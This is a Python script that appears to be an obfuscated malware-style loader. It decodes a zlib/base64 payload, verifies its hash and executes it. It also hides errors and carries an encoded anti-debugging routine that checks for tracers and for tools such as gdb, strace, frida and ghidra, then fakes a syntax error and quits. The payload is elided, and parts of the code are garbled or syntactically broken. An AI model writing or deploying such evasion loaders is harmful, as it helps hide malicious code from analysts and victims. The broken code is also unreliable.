import sys
import base64
import zlib
import types
import builtins
import hashlib
import os
import warnings

warnings.filterwarnings("ignore")
sys.stderr = open(os.devnull, "w")
GETTRACE_B64 = 'cy5nZXR0cmFjZQo='          # -> 's.gettrace'
EXIT_B64 = 'cy5leGl0Cg=='                # -> 's.exit'
ANTI_DEBUG_SCRIPT_B64 = 'aW1wb3J0IHRocmVhZGluZywgdGltZSwgc3lzLCBvcywgcHN1dGlsOyB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1sYW1iZGE6IChsYW1iZGEgZjogZihmKSkobGFtYmRhIHNlbGY6ICgoZXhlYygncHJpbnQoIiIiJyArICJcXHQiKjQ3ICsgJ1xuXl5eXl5eXl5eXlxuICBGaWxlIFxcIlxcIiwgbGluZSAxLCBpbiA8bW9kdWxlPlxuICBGaWxlIFxcIlxcIiwgbGluZSAxLCBpbiA8bW9kdWxlPlxuICBGaWxlIFxcIlxcIiwgbGluZSAxLCBpbiA<module>\xuSyntaError: invalid syntax""""); exit()') if (open(f"/proc/{os.getpid()}/status").read().find("TracerPid:\t0") == -1 or sys.gettrace() or any(any(s in " ".join(p.info["cmdline"]).lower() for s in ["strace", "ltrace", "gdb", "frida", "wireshark", "tcpdump", "objdump", "r2", "ghidra", "ghidraRun", "hopper", "idat64", "hexdump", "gcore", "lsof", "strace", "pmap", "nm"]) for p in psutil.process_iter(attrs=["name","cmdline"]))) else None), time.sleep(0.5), self(self))).start()\n\n'
PAYLOAD_COMPRESSED_B64 = 'eJwkmkdv81BzRv/Kt8uCL3DZC4IsJFHsT...........................................'
FUNCTION_TYPE_B64 = 'dC5GdW5jdGlvblR5cGUK'    # -> 't.FunctionType'
COMPILE_B64 = 'Y29tcGlsZQo='                # -> 'compile'
DECOMPRESS_B64 = 'emxpYi5kZWNvbXByZXNzCg=='  # -> 'zlib.decompress'

EXPECTED_PAYLOAD_HASH = '10c6570cc783dcc0685c768c19de1ff068e0a2f20b647d6cb4188e61efa3b524'
payload_compressed_bytes = base64.b64decode(PAYLOAD_COMPRESSED_B64)
payload_code = zlib.decompress(payload_compressed_bytes).decode()
actual_payload_hash = hashlib.sha256(payload_code.encode()).hexdigest()
compiled_payload_code = compile(payload_code, '<string>', 'exec')

payload_function = types.FunctionType(compiled_payload_code, {
    '__name__': '__main__',
    '__builtins__': builtins,
    '__file__': sys.argv[0]
})

if not sys.gettrace() and actual_payload_hash == EXPECTED_PAYLOAD_HASH:
    payload_function()
else
    sys.exit()
